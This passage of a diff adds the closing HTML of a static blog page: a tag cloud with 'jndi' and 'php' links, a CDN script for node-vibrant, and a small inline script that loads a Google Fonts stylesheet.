+            <a href="/tags/jndi/" class="font_size_1">
+                jndi
+            </a>
+        
+            <a href="/tags/php/" class="font_size_1">
+                php
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
